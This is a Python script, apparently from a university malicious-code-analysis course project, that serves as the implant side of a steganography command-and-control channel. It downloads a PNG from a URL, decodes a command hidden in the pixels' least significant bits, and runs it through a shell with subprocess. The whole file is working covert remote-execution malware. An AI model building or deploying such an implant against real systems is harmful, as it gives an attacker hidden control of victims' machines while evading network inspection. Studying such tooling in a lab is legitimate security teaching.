#!/usr/bin/env python3
"""
Steganography Decoder / Implant - Malware-side tool
Fetches an encoded image from a URL, extracts the hidden command, and executes it.

CMU Heinz College - 95-759 Malicious Code Analysis
Group Project: Steganography-Based C2 Channel

Usage:
    python decoder.py <image_url_or_path>

Examples:
    python decoder.py http://localhost:8080/encoded.png
    python decoder.py images/encoded.png
"""

import argparse
import io
import subprocess
import sys

import requests
from PIL import Image


def extract_command(img):
    """Extract a hidden command from an image using LSB steganography."""

    img = img.convert('RGB')
    pixels = img.load()
    width, height = img.size

    print(f"[*] Image size: {width}x{height} ({width * height} pixels)")

    # Step 1: Extract all LSBs from pixels
    print("[*] Extracting LSB data from pixels...")
    all_bits = ""

    for y in range(height):
        for x in range(width):
            r, g, b = pixels[x, y]
            all_bits += str(r & 1)  # LSB of Red
            all_bits += str(g & 1)  # LSB of Green
            all_bits += str(b & 1)  # LSB of Blue

    # Step 2: Read the 32-bit length header
    if len(all_bits) < 32:
        print("[-] ERROR: Image too small to contain a valid header.")
        sys.exit(1)

    msg_length = int(all_bits[:32], 2)
    msg_chars = msg_length // 8
    print(f"[*] Reading length header: {msg_length} bits ({msg_chars} characters)")

    # Sanity check on message length
    if msg_length <= 0 or msg_length > len(all_bits) - 32:
        print("[-] ERROR: Invalid message length in header.")
        print("[-] This image may not contain an encoded message.")
        sys.exit(1)

    if msg_length % 8 != 0:
        print("[-] WARNING: Message length is not a multiple of 8 bits.")

    # Step 3: Extract the message bits
    print("[*] Extracting message bits...")
    message_bits = all_bits[32: 32 + msg_length]

    # Step 4: Convert bits back to text
    command = ""
    for i in range(0, len(message_bits), 8):
        byte = message_bits[i:i + 8]
        if len(byte) == 8:
            char_val = int(byte, 2)
            # Validate it's a printable ASCII character or common control char
            if 0 <= char_val <= 127:
                command += chr(char_val)
            else:
                print(f"[-] WARNING: Non-ASCII byte detected: {char_val}")
                command += chr(char_val)

    return command


def fetch_image_from_url(url):
    """Download an image from a URL and return a PIL Image object."""
    print(f"[*] Fetching image from {url} ...")
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
    except requests.exceptions.ConnectionError:
        print(f"[-] ERROR: Could not connect to {url}")
        print("[-] Make sure the server is running (python server.py)")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print(f"[-] ERROR: Request timed out for {url}")
        sys.exit(1)
    except requests.exceptions.HTTPError as e:
        print(f"[-] ERROR: HTTP error: {e}")
        sys.exit(1)

    content_length = len(response.content)
    print(f"[*] Image downloaded: {content_length} bytes")

    img = Image.open(io.BytesIO(response.content))
    return img


def load_image_from_file(path):
    """Load an image from a local file path."""
    print(f"[*] Loading image from file: {path}")
    try:
        img = Image.open(path)
        return img
    except FileNotFoundError:
        print(f"[-] ERROR: File not found: {path}")
        sys.exit(1)
    except Exception as e:
        print(f"[-] ERROR: Could not open image: {e}")
        sys.exit(1)


def execute_command(command):
    """Execute the extracted command and display its output."""
    print(f"[*] Executing command...")
    print()

    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )

        print("[+] Command output:")
        print("=" * 60)
        if result.stdout:
            print(result.stdout)
        if result.stderr:
            print("[stderr]:", result.stderr)
        if not result.stdout and not result.stderr:
            print("(no output)")
        print("=" * 60)

        if result.returncode != 0:
            print(f"[*] Command exited with return code: {result.returncode}")

    except subprocess.TimeoutExpired:
        print("[-] ERROR: Command timed out after 30 seconds.")
    except Exception as e:
        print(f"[-] ERROR: Failed to execute command: {e}")


def main():
    parser = argparse.ArgumentParser(
        description="Steganography Decoder - Extract and execute hidden commands from PNG images",
        epilog="Example: python decoder.py http://localhost:8080/encoded.png"
    )
    parser.add_argument(
        "source",
        help="URL or local file path of the encoded PNG image"
    )
    parser.add_argument(
        "--no-execute", "-n",
        action="store_true",
        help="Extract the command but don't execute it (safe mode)"
    )

    args = parser.parse_args()

    print("=" * 60)
    print("  STEGANOGRAPHY DECODER - LSB Command Extraction")
    print("=" * 60)
    print()

    # Determine if source is a URL or local file
    if args.source.startswith("http://") or args.source.startswith("https://"):
        img = fetch_image_from_url(args.source)
    else:
        img = load_image_from_file(args.source)

    # Extract the hidden command
    command = extract_command(img)

    print()
    print(f"[+] Extracted command: {command}")
    print()

    # Execute or display based on flag
    if args.no_execute:
        print("[*] --no-execute flag set. Skipping command execution.")
    else:
        execute_command(command)

    print()
    print("=" * 60)


if __name__ == "__main__":
    main()
